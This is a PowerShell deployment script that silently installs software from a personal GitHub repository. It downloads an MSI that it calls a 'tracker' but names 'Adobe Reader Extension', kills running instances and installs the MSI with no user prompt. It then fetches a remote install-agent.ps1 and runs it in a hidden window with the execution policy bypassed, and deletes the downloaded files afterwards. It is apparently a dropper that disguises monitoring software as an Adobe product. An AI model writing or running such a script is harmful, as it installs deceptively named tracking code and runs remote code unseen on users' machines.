$ErrorActionPreference = 'Stop'

$TempPath = 'C:\Windows\Temp'
$LogFile  = Join-Path $TempPath 'deploy.log'

# --- Adobe Reader Extension target release ---
$TargetVer = '1.0.3'
$DisplayNames = @('Adobe Reader Extension', 'DX CyberProtect')
$ProcessNames = @('adobeextension', 'DX-CyberProtect')

$MsiUrl  = "https://raw.githubusercontent.com/dycheto/agent-dev/main/adobeextension_v$TargetVer.msi"
$MsiPath = Join-Path $TempPath "adobeextension_v$TargetVer.msi"

# --- Wazuh agent installer ---
$InstallScriptUrl  = 'https://raw.githubusercontent.com/dycheto/agent-dev/main/install-agent.ps1'
$InstallScriptPath = Join-Path $TempPath 'install-agent.ps1'

function Write-Log {
    param([string]$Message)
    Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message"
}

function Get-InstalledEntry {
    param([string[]]$Names)

    $Paths = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )

    foreach ($Path in $Paths) {
        $Item = Get-ItemProperty $Path -ErrorAction SilentlyContinue |
            Where-Object { $Names -contains $_.DisplayName } |
            Select-Object -First 1

        if ($Item) { return $Item }
    }

    return $null
}

function Test-InstalledSoftware {
    param([string]$DisplayName)

    $Paths = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )

    foreach ($Path in $Paths) {
        $Item = Get-ItemProperty $Path -ErrorAction SilentlyContinue |
            Where-Object { $_.DisplayName -eq $DisplayName }

        if ($Item) { return $true }
    }

    return $false
}

function Stop-TrackerProcesses {
    param([string[]]$Names)

    foreach ($Name in $Names) {
        $procs = Get-Process -Name $Name -ErrorAction SilentlyContinue
        if (-not $procs) {
            Write-Log "No running $Name.exe found."
            continue
        }

        Write-Log "Stopping $($procs.Count) $Name.exe process(es)."
        foreach ($p in $procs) {
            try {
                $p.Kill()
                $null = $p.WaitForExit(10000)
            }
            catch {
                Write-Log "Failed to kill PID $($p.Id) for $Name.exe: $($_.Exception.Message)"
            }
        }

        Start-Process -FilePath 'taskkill.exe' `
            -ArgumentList "/IM $Name.exe /F /T" `
            -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
    }
}

function Install-AdobeExtension {
    Write-Log "Downloading MSI from $MsiUrl"
    Invoke-WebRequest -UseBasicParsing -Uri $MsiUrl -OutFile $MsiPath

    Write-Log 'Installing/upgrading Adobe Reader Extension silently.'
    $msi = Start-Process -FilePath 'msiexec.exe' `
        -ArgumentList "/i `"$MsiPath`" /qn /norestart REBOOT=ReallySuppress" `
        -Wait -PassThru

    Write-Log "MSI exit code: $($msi.ExitCode)"
    return $msi.ExitCode
}

try {
    Write-Log '--- Bootstrap started ---'

    $InstalledEntry = Get-InstalledEntry -Names $DisplayNames
    $InstalledName = if ($InstalledEntry) { $InstalledEntry.DisplayName } else { $null }
    $InstalledVer  = if ($InstalledEntry) { $InstalledEntry.DisplayVersion } else { $null }

    $WazuhInstalled = Test-InstalledSoftware -DisplayName 'Wazuh Agent'

    Write-Log "Detected tracker: $InstalledName"
    Write-Log "Detected tracker version: $InstalledVer (target $TargetVer)"
    Write-Log "Shield Agent installed: $WazuhInstalled"

    # ---- Tracker: install or upgrade as needed ----
    if (-not $InstalledEntry) {
        Write-Log 'Abode is missing. Performing fresh install.'
        Install-AdobeExtension | Out-Null
    }
    elseif ($InstalledVer -ne $TargetVer) {
        Write-Log "Abode version mismatch ($InstalledVer != $TargetVer). Upgrading."
        Stop-TrackerProcesses -Names $ProcessNames
        Start-Sleep -Seconds 2
        Install-AdobeExtension | Out-Null
    }
    else {
        Write-Log "Abode already at target version $TargetVer. Skipping."
    }

    # ---- Wazuh Agent ----
    if (-not $WazuhInstalled) {
        Write-Log 'Shield Agent is missing. Downloading install-agent.ps1.'
        Invoke-WebRequest -UseBasicParsing -Uri $InstallScriptUrl -OutFile $InstallScriptPath

        Write-Log 'Running install-agent.ps1.'
        $ps = Start-Process -FilePath 'powershell.exe' `
            -ArgumentList "-ExecutionPolicy Bypass -File `"$InstallScriptPath`"" `
            -WindowStyle Hidden -Wait -PassThru

        Write-Log "install-agent.ps1 exit code: $($ps.ExitCode)"
    }
    else {
        Write-Log 'Shield Agent already installed. Skipping install-agent.ps1.'
    }

    Write-Log 'Cleaning up downloaded files.'
    Remove-Item -Path $MsiPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $InstallScriptPath -Force -ErrorAction SilentlyContinue

    Write-Log '--- Bootstrap completed ---'
}
catch {
    Write-Log "Bootstrap failed: $($_.Exception.Message)"
    exit 1
}